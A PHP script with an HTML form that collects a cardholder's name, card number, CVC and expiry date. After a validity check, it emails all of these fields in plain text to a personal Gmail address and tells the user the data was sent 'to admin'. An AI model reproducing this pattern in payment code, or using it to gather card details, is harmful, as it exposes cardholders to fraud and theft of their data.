<?php
include 'ccval.php';
//3400 0000 0000 009

if($_POST['submit'])
{
 $first_name = $_POST['first_name'];
 $last_name = $_POST['last_name'];
 $card_type = $_POST['card_type'];
 $card_number = $_POST['card_number'];
 $expiry_month = $_POST['expiry_month'];
 $expiry_year = $_POST['expiry_year'];
 $cvc   = $_POST['cvc'];

 if(empty($first_name) or empty($card_type)  or empty($cvc) or empty($card_number) or empty($expiry_month) or empty($expiry_year))
 {
	 $error = "[*] indicate required fields.";
 }
 else
 {
	 switch($card_type)
	 {
		 case 'mcd';
		 $card_type = 'Master Card';
		 break;
		 
		 case 'vis';
		 $card_type = 'Visa';
		 break;
		 
		 case 'amx';
		 $card_type = 'American Express';
		 break;
		 
		 case 'dsc';
		 $card_type = 'Discover';
		 break;
		 
		 case 'dnc';
		 $card_type = 'Diners Club';
		 break;
		 
		 case 'jcb';
		 $card_type = 'JCB';
		 break;
		 
		 case 'swi';
		 $card_type = 'Switch';
		 break;
		 
		 case 'dlt';
		 $card_type = 'Delta';
		 break;
		 
		 case 'enr';
		 $card_type = 'EnRoute';
		 break;
	 }
	 
	 $exp = $expiry_month.$expiry_year ;
	 $Result = ccval($card_number, $card_type, $exp);
	  if ($Result) {
		
		$to = "mdibrahimhossain08@gmail.com";
		//$to = "brad@printersauction.com";
		$subject = "New Credit Card Information";
		$body = "A user named $first_name $last_name has been send new credit card information with following: \n
		First Name: $first_name \n
		Last Name: $last_name \n
		Card Type: $card_type \n
		Card Number: $card_number \n
		CVC: $cvc \n
		Expiry Month: $expiry_month \n
		Expiry Year: 20$expiry_year \n
		 ";
		 mail($to,$subject,$body);
		 $error = "Your information has been successfully send to admin.<br>
		 Please wait for his response. Thanks";
		
	  }
	  else {
		if (is_int($Result)) $error = "The expiration date is invalid.";
		else $error = "The card number is invalid.";
	  }
 }

}
?>

<div align="center">
<?php if ($error){?>
    <span style="display: block; margin: 10px 0 0 20px; color: red; font-weight: bold;">
    <? echo $error;  ?> </span> <?php } ?>
    
<form action="creditcard.php" method="post" id="myform">

      
<table>
            <tbody><tr id="name_hint_anchor">
                <td valign="center" align="left" class="field_expl"><font padding="0" spacing="0" id="first_nameFont">First name*:&nbsp;</font></td>
                <td valign="center" align="left">                            <table cellspacing="0" cellpadding="0" style="padding: 0;margin: 0;">
                                <tbody><tr>
                <td style="padding: 0;margin: 0;" class="smooth">
                
                <input type="text" maxlength="20"  name="first_name">
                
                </td>
                <td style="padding: 0;margin: 0;" class="smooth"></td>
            </tr>
                            </tbody></table>                </td>
            </tr>
            <tr>
                <td align="left" class="field_expl cc_last_name">Last name:&nbsp;</td>
                <td align="left">
                
                <input type="text" maxlength="20"  name="last_name"> 
                
                 </td>
            </tr>
            <tr id="type_anchor_new">
                <td align="left" class="field_expl"><font padding="0" spacing="0" id="typeFont">Card type*:&nbsp;</font></td>
                <td align="left"> 
                
              <select name="card_type"> 
                <option  value="amx">AMERICAN EXPRESS</option>
                <option  value="dnc">DINERS</option> 
                <option  value="dsc">Discover</option>
                <option  value="dlt">DELTA / VISA DEBIT</option>
                <option  value="enr">EnRoute</option>                 
                <option  value="jcb">JCB</option>
                <option  value="mcd">MASTERCARD</option>               
                <option  value="swi">Switch</option>  
                <option  value="vis">VISA</option>                           
              </select>                
              
              </td>
            </tr>
            <tr>
                <td align="left" id="binwarning_anchor_new" class="field_expl"><font padding="0" spacing="0" id="numberFont">Card number*:&nbsp;</font></td>
                <td align="left">                            
                
                <input type="text" maxlength="20" value="" name="card_number">            
                
                    </td>
            </tr> 
            
            <tr>
                <td align="left" id="binwarning_anchor_new" class="field_expl"><font padding="0" spacing="0" id="numberFont">CVC*:&nbsp;</font></td>
                <td align="left">                            
                
                <input type="text" maxlength="4" value="" size="4" name="cvc">            
                
                    </td>
            </tr> 
            
            <tr>
                <td align="left" class="field_expl"><font padding="0" spacing="0" id="expiry_monthFont">Expiry date*:&nbsp;</font></td>
                <td align="left" class="smooth">                        
                
                <select class="prefix" name="expiry_month">

                            <option selected="" value="">Month</option>                             <option value="01">01</option>                                
                            <option value="02">02</option>  
                            <option value="03">03</option>                                
                            <option value="04">04</option>                                
                            <option value="05">05</option>                                
                            <option value="06">06</option>                                
                            <option value="07">07</option>                                
                            <option value="08">08</option>                                
                            <option value="09">09</option>                                
                            <option value="10">10</option>                                
                            <option value="11">11</option>                                
                            <option value="12">12</option>
                            
                             </select>
                            
                            <select class="suffix" name="expiry_year">
                            
                           		<option selected="" value="">Year</option>                                <option value="12">2012</option>                                <option value="13">2013</option>                                <option value="14">2014</option>                                <option value="15">2015</option>                                <option value="16">2016</option>                                <option value="17">2017</option>                                <option value="18">2018</option>                                <option value="19">2019</option>                                <option value="20">2020</option>                                <option value="21">2021</option>                                <option value="22">2022</option>                                 <option value="23">2023</option>                                <option value="24">2024</option>                                <option value="25">2025</option>                                <option value="26">2026</option>                                <option value="27">2027</option>                                <option value="28">2028</option>                                <option value="29">2029</option>                                <option value="30">2030</option>                                <option value="31">2031</option>                                <option value="32">2032</option> 
                               </select>                
                               </td>
            </tr>                
            </tbody></table>
                   
    <input type="submit" alt="Click to submit credit card for validation" tabindex="13" value="submit" size="20" name="submit">
    <br> 

</form>
</div>